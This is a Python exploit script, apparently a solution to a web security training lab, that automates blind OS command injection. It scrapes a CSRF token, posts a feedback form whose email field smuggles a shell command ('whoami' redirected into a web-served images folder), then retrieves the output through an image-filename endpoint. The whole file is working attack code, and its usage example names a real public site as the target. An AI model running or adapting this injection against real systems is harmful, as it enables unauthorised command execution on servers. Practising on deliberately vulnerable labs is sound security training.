#!/bin/env python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup 
from urllib.parse import urlparse
from colorama import init

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.2661.102 UBrowser/6.1.2107.204 Safari/537.36'}

def get_csrf_token(s, url):
	feedback_path = '/feedback'
	r = s.get(url + feedback_path, headers=header, verify=False)#, proxies=proxies)
	if (r.status_code == 200):
		suop = BeautifulSoup(r.text, 'html.parser')
		csrf = suop.find("input")['value']
		return csrf
	else:
		print("\033[1;31;40m[-] The lab url is invalid, please get it again.")
		sys.exit(-1)

def exploit_command_injection(s, url):
	submit_feedback_path = '/feedback/submit'
	payloads = 'admin@gmail.com & whoami>/var/www/images/output.txt #'
	csrf_token = get_csrf_token(s, url)
	data = {'csrf': csrf_token, 'name': 'admin', 'email': payloads, 'subject': 'admin', 'message': 'admin'}
	req = s.post(url + submit_feedback_path, data=data, headers=header, verify=False)#, proxies=proxies)
	print("\033[1;33;40m[+] Verifying if command injection exploit worked...")

	# verify comand injection
	file_path = '/image?filename=output.txt'
	req2 = s.get(url + file_path, headers=header, verify=False, allow_redirects=False)#, proxies=proxies)
	if (req2.status_code == 200):
		print("\033[1;32;40m[+] Blind OS command injection with output redirection successful!")
		print("\033[1;32;40m[+] The follwing is the content of command: " + req2.text)
	else:
		print("\033[1;31;40m[-] Blind OS command injection not successful.")
		print(req.text)

def main():
	if len(sys.argv) != 2:
		print("\033[1;31;40m[+] Usage: {0} <url>".format(sys.argv[0]))
		print("\033[1;31;40m[+] Example: {0} https://www.bing.com".format(sys.argv[0]))
		sys.exit(-1)

	# filter end of url /
	o = urlparse(sys.argv[1])
	url = o.scheme + "://" + o.hostname

	print("\033[36m[+] Checking if email parameter is vulnerable to blind OS command injection...")

	s = requests.Session()
	exploit_command_injection(s, url)


if __name__ == "__main__":
	main()